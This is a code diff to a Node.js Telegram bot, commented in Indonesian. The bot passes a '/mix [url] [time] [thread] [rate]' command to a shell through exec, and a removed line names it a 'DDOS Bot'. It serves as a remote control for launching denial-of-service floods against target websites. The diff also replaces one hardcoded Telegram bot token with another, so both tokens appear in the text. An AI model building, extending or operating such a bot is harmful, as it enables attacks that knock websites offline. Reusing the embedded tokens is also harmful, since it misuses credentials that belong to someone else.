@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
 // Ganti dengan token bot Telegram Anda
-const token = '7220570795:AAGrXxndOJMNNGloJS5Fkl_A8L2QDIBW-jk';
+const token = '7069670027:AAGrM4SX8wAyoFmZpKQQo83qS3aANewmleI';
 
 // Inisialisasi bot dengan token
 const bot = new TelegramBot(token, { polling: true });
@@ -28,10 +28,6 @@ bot.on('message', (msg) => {
   // Mencatat aktivitas penggunaan bot di console log
   logActivity(msg);
 
-  if (command.startsWith('/start')) {
-    bot.sendMessage(chatId, 'Hello User, DDOS Bot by @gravemods - @zemoengine');
-    return;
-  }
   // Menanggapi perintah /mix
   if (command.startsWith('/mix')) {
     // Mengekstrak argumen dari pesan
@@ -51,7 +47,6 @@ bot.on('message', (msg) => {
           return;
         }
         if (stderr) {
-          bot.sendMessage(chatId, 'Attacking......');
           console.error(`stderr: ${stderr}`);
           bot.sendMessage(chatId, 'Successful');
           return;
@@ -62,7 +57,7 @@ bot.on('message', (msg) => {
       });
     } else {
       // Memberi tahu pengguna bahwa format pesan tidak benar
-      bot.sendMessage(chatId, 'Please Follow The Format : /mix [url] [time] [thread] [rate]');
+      bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /mix [url] [time] [thread] [rate]');
     }
   }
 });
